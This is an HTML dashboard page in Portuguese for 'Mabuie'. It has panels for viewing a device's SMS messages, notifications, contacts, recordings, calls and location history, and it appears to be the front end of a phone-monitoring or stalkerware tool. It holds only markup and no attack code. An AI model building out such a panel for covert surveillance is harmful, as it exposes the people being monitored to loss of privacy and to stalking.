<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Mabuie - Painel</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
  <style>
    body { font-family: Arial, sans-serif; margin:12px; max-width:1200px; }
    header { display:flex; align-items:center; justify-content:space-between; margin-bottom:12px;}
    .toolbar { display:flex; gap:8px; align-items:center; }
    .icon-btn { padding:8px 12px; background:#eee; border-radius:6px; cursor:pointer; display:flex; align-items:center; gap:8px;}
    .hidden { display:none; }
    #map { height:420px; border:1px solid #ddd; margin-bottom:12px; display:none; }
    section { margin-bottom: 16px; }
    .status-dot { font-weight:bold; margin-left:6px; }
    #mediaPlayer video { max-width:100%; height:auto; }
    input, button { padding:8px; margin:4px 0; }
  </style>
</head>
<body>
  <header>
    <div>
      <h1>Mabuie — Painel</h1>
      <div id="userInfo"></div>
    </div>
    <div class="toolbar">
      <div class="icon-btn" id="iconDevices">📱 Dispositivos</div>
      <div class="icon-btn" id="iconMessages">✉️ Mensagens</div>
      <div class="icon-btn" id="iconNotifs">🔔 Notificações</div>
      <div class="icon-btn" id="iconContacts">📇 Contactos</div>
      <div class="icon-btn" id="iconMedia">📁 Media</div>
      <div class="icon-btn" id="iconMap">🗺️ Mapa</div>
      <div class="icon-btn" id="btnLogout">🔓 Sair</div>
    </div>
  </header>

  <div id="loginBox">
    <input id="username" placeholder="Usuário" />
    <input id="password" placeholder="Senha" type="password" />
    <button id="btnLogin">Entrar</button>
    <button id="btnRegister">Registar</button>
    <p id="loginMsg"></p>
  </div>

  <div id="dashboard" class="hidden">
    <div id="map"></div>

    <section id="devicesSection">
      <h2>Dispositivos</h2>
      <div id="devicesList">Carregando...</div>
    </section>

    <section id="contactsSection" class="hidden">
      <h2>Contactos</h2>
      <ul id="contactsList"></ul>
    </section>

    <section id="messagesSection" class="hidden">
      <h2>Mensagens</h2>
      <ul id="smsList"></ul>
    </section>

    <section id="notifsSection" class="hidden">
      <h2>Notificações</h2>
      <ul id="notifList"></ul>
    </section>

    <section id="mediaSection" class="hidden">
      <h2>Media / Gravações</h2>
      <ul id="mediaList"></ul>
      <div id="mediaPlayer"></div>
    </section>

    <section id="callsSection" class="hidden">
      <h2>Chamadas</h2>
      <ul id="callsList"></ul>
    </section>

    <section id="historySection" class="hidden">
      <h2>Histórico de Localizações (Mapa)</h2>
      <div id="historyList"></div>
    </section>
  </div>

  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script src="main.js"></script>
</body>
</html>
